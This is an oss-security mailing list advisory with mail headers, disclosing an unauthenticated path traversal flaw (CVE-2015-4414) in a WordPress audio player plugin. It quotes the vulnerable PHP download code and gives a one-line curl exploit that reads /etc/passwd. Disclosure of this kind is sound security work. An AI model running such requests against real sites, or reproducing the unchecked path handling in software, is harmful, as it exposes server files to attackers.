X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2978" "Wednesday" "10" "June" "2015" "16:59:05" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<B8A5631A-C79C-414C-9067-CBF344C92B07@me.com>" "68" "[oss-security] Path Traversal vulnerability in Wordpress plugin se-html5-album-audio-player v1.1.0" nil nil nil "6" "2015061020:59:05" "[oss-security] Path Traversal vulnerability in Wordpress plugin se-html5-album-audio-player v1.1.0" (number mark "        larry0@me.co Jun 10   68/2978  " thread-indent "\"[oss-security] Path Traversal vulnerability in Wordpress plugin se-html5-album-audio-player v1.1.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 9917 invoked by uid 550); 10 Jun 2015 20:59:23 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 9861 invoked from network); 10 Jun 2015 20:59:18 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-06-10_15:2015-06-10,2015-06-10,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1506100329
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <B8A5631A-C79C-414C-9067-CBF344C92B07@me.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Date: Wed, 10 Jun 2015 16:59:05 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Path Traversal vulnerability in Wordpress plugin
 se-html5-album-audio-player v1.1.0
To: Open Source Security <oss-security@lists.openwall.com>

Title: Path Traversal vulnerability in Wordpress plugin se-html5-album-audi=
o-player v1.1.0
Author: Larry W. Cashdollar, @_larry0
Date: 2015-06-06
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D124
Download Site: https://wordpress.org/plugins/se-html5-album-audio-player/
Vendor: https://profiles.wordpress.org/sedevelops/
Vendor Notified: 2015-06-06
Vendor Contact: https://profiles.wordpress.org/sedevelops/
Description:=20
An HTML5 Album Audio Player. A plugin to archive, present, and play collect=
ions of mp3s (or other html5 audio formats) as albums within your post.

Vulnerability:
The se-html5-album-audio-player v1.1.0  plugin for wordpress has a remote f=
ile download vulnerability.  The download_audio.php file does not correctly=
 check the file path, it only attempts to check if the path is in /wp-conte=
nt/uploads which is easily defeated with ../.

This vulnerability doesn=E2=80=99t require authentication to the Wordpress =
site.

File ./se-html5-album-audio-player/download_audio.php:

 3 $file_name =3D $_SERVER['DOCUMENT_ROOT'] . $_GET['file'];
 4 $is_in_uploads_dir =3D strpos($file_name, '/wp-content/uploads/');
 5 // make sure it's a file before doing anything!
 6 if( is_file($file_name) && $is_in_uploads_dir !=3D=3D false ) {
 7=20
 8         // required for IE
 9         if(ini_get('zlib.output_compression')) { ini_set('zlib.output_co=
mpression', 'Off');         }
10=20=20=20=20=20
11         // get the file mime type using the file extension
12         switch(strtolower(substr(strrchr($file_name, '.'), 1))) {
13                 case 'pdf': $mime =3D 'application/pdf'; break;
14                 case 'zip': $mime =3D 'application/zip'; break;
15                 case 'jpeg':
16                 case 'jpg': $mime =3D 'image/jpg'; break;
17                 default: $mime =3D 'application/force-download';
18         }
19         header('Pragma: public');       // required
20         header('Expires: 0');           // no cache
21         header('Cache-Control: must-revalidate, post-check=3D0, pre-chec=
k=3D0');
22         header('Last-Modified: '.gmdate ('D, d M Y H:i:s', filemtime ($f=
ile_name)).' GMT');
23         header('Cache-Control: private',false);
24         header('Content-Type: '.$mime);
25         header('Content-Disposition: attachment; filename=3D"'.basename(=
$file_name).'"');
26         header('Content-Transfer-Encoding: binary');=20=20=20=20=20=20=
=20=20
27         header('Content-Length: '.filesize($file_name));        // provi=
de file size
28         header('Connection: close');
29         readfile($file_name);           // push it out
30         exit();

The above code does not verify if a user is logged in, and do proper sanity=
 checking if the file is outside of the uploads directory.

CVEID: 2015-4414
OSVDB:
Exploit Code:
	=E2=80=A2 $ curl http://www.vapidlabs.com/wp-content/plugins/se-html5-albu=
m-audio-player/download_audio.php?file=3D/wp-content/uploads/../../../../..=
/etc/passwd=
